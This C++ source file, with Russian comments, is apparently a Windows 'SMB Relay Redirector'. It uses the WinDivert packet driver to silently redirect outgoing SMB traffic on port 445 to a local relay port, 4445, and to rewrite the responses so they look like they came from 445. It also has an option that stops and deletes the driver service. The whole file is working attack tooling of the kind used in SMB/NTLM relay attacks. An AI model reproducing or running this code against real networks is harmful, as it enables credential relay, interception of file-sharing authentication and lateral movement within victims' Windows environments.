#define _WINSOCK_DEPRECATED_NO_WARNINGS 
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winsvc.h>
#include "windivert.h"

#pragma comment(lib, "ws2_32.lib")
#ifdef _WIN64
#pragma comment(lib, ".\\windivert\\x64\\WinDivert.lib")
#else
#pragma comment(lib, ".\\windivert\\x86\\WinDivert.lib")
#endif

constexpr UINT16 RELAY_PORT = 4445;
static HANDLE hFilter = INVALID_HANDLE_VALUE;

// Функция выгрузки драйвера
bool UninstallWinDivertDriver() {
    std::cout << "[+] Uninstalling WinDivert driver..." << std::endl;

    SC_HANDLE manager = NULL;
    SC_HANDLE service = NULL;
    SERVICE_STATUS status;

    // Создаём мьютекс
    HANDLE mutex = CreateMutex(NULL, FALSE, L"WinDivertDriverInstallMutex");
    if (mutex == NULL) {
        std::cerr << "[-] Failed to create mutex" << std::endl;
        return false;
    }

    switch (WaitForSingleObject(mutex, INFINITE)) {
    case WAIT_OBJECT_0:
    case WAIT_ABANDONED:
        break;
    default:
        std::cerr << "[-] Failed to acquire mutex" << std::endl;
        CloseHandle(mutex);
        return false;
    }

    // Открываем Service Manager
    manager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (manager == NULL) {
        std::cerr << "[-] Failed to open service manager" << std::endl;
        ReleaseMutex(mutex);
        CloseHandle(mutex);
        return false;
    }

    // Открываем службу WinDivert
    service = OpenService(manager, L"WinDivert", SERVICE_ALL_ACCESS);
    if (service == NULL) {
        std::cout << "[*] WinDivert service not found (already uninstalled)" << std::endl;
        CloseServiceHandle(manager);
        ReleaseMutex(mutex);
        CloseHandle(mutex);
        return true;
    }

    // Останавливаем службу
    std::cout << "[+] Stopping WinDivert service..." << std::endl;
    if (ControlService(service, SERVICE_CONTROL_STOP, &status)) {
        // Ждём остановки
        for (int i = 0; i < 10; i++) {
            if (QueryServiceStatus(service, &status)) {
                if (status.dwCurrentState == SERVICE_STOPPED) {
                    std::cout << "[+] Service stopped successfully" << std::endl;
                    break;
                }
            }
            Sleep(500);
        }
    }

    // Удаляем службу
    std::cout << "[+] Deleting WinDivert service..." << std::endl;
    DeleteService(service);

    // Закрываем хэндлы
    CloseServiceHandle(service);
    CloseServiceHandle(manager);

    ReleaseMutex(mutex);
    CloseHandle(mutex);

    std::cout << "[+] WinDivert driver uninstalled" << std::endl;
    return true;
}

// Функция очистки (закрытие handle)
void Cleanup() {
    std::cout << "[+] Cleaning up WinDivert handle..." << std::endl;

    if (hFilter != INVALID_HANDLE_VALUE) {
        WinDivertClose(hFilter);
        hFilter = INVALID_HANDLE_VALUE;
    }

    std::cout << "[+] Handle closed" << std::endl;
}

int main(int argc, char** argv) {
    // Проверка флага uninstall
    if (argc > 1 && strcmp(argv[1], "uninstall") == 0) {
        std::cout << "[+] Running in uninstall mode..." << std::endl;
        UninstallWinDivertDriver();
        std::cout << "[+] Uninstall completed" << std::endl;
        return 0;
    }

    std::cout << "[+] Running SMB Relay Redirector..." << std::endl;
    std::cout << "[+] Redirecting port 445 -> " << RELAY_PORT << std::endl;
    std::cout << "[+] Use '" << argv[0] << " uninstall' to uninstall driver" << std::endl;
    std::cout << "[+] Press Ctrl+C to exit" << std::endl;

    // Фильтр для SMB трафика
    hFilter = WinDivertOpen(
        "tcp and (tcp.DstPort == 445 or tcp.SrcPort == 4445)",
        WINDIVERT_LAYER_NETWORK,
        0,
        0
    );

    if (hFilter == INVALID_HANDLE_VALUE) {
        std::cerr << "[!] WinDivertOpen failed: " << GetLastError() << std::endl;
        return 1;
    }

    std::cout << "[+] WinDivert initialized successfully" << std::endl;

    UINT8 packet[0xFFFF];
    WINDIVERT_ADDRESS addr{};
    UINT packetLen;

    // Главный цикл (без обработки сигналов)
    while (true) {
        if (!WinDivertRecv(hFilter, packet, sizeof(packet), &packetLen, &addr)) {
            continue;
        }

        // Парсинг заголовков
        PWINDIVERT_IPHDR ipHeader = nullptr;
        PWINDIVERT_IPV6HDR ipv6Header = nullptr;
        UINT8 protocol = 0;
        PWINDIVERT_ICMPHDR icmpHeader = nullptr;
        PWINDIVERT_ICMPV6HDR icmpv6Header = nullptr;
        PWINDIVERT_TCPHDR tcpHeader = nullptr;
        PWINDIVERT_UDPHDR udpHeader = nullptr;
        PVOID payload = nullptr;
        UINT payloadLen = 0;
        PVOID next = nullptr;
        UINT nextLen = 0;

        WinDivertHelperParsePacket(
            packet, packetLen,
            &ipHeader, &ipv6Header,
            &protocol,
            &icmpHeader, &icmpv6Header,
            &tcpHeader, &udpHeader,
            &payload, &payloadLen,
            &next, &nextLen
        );

        // Только TCP пакеты
        if (tcpHeader == nullptr || ipHeader == nullptr) {
            WinDivertSend(hFilter, packet, packetLen, nullptr, &addr);
            continue;
        }

        UINT16 srcPort = ntohs(tcpHeader->SrcPort);
        UINT16 dstPort = ntohs(tcpHeader->DstPort);

        // Исходящие запросы: 445 -> 4445
        if (dstPort == 445) {
            std::cout << "[>] Outgoing SMB: " << inet_ntoa(*(in_addr*)&ipHeader->SrcAddr)
                << ":" << srcPort << " -> " << inet_ntoa(*(in_addr*)&ipHeader->DstAddr)
                << ":445 => Redirecting to port " << RELAY_PORT << std::endl;

            tcpHeader->DstPort = htons(RELAY_PORT);
            WinDivertHelperCalcChecksums(packet, packetLen, &addr, 0);
            WinDivertSend(hFilter, packet, packetLen, nullptr, &addr);
        }
        // Входящие ответы: 4445 -> 445
        else if (srcPort == 4445) {
            std::cout << "[<] Incoming response: " << inet_ntoa(*(in_addr*)&ipHeader->SrcAddr)
                << ":" << srcPort << " -> " << inet_ntoa(*(in_addr*)&ipHeader->DstAddr)
                << ":" << dstPort << " => Restoring port 445" << std::endl;

            tcpHeader->SrcPort = htons(445);
            WinDivertHelperCalcChecksums(packet, packetLen, &addr, 0);
            WinDivertSend(hFilter, packet, packetLen, nullptr, &addr);
        }
        else {
            // Остальной трафик пропускаем без изменений
            WinDivertSend(hFilter, packet, packetLen, nullptr, &addr);
        }
    }

    // Эта часть никогда не выполнится из-за бесконечного цикла
    // Но оставлю для корректности
    Cleanup();

    return 0;
}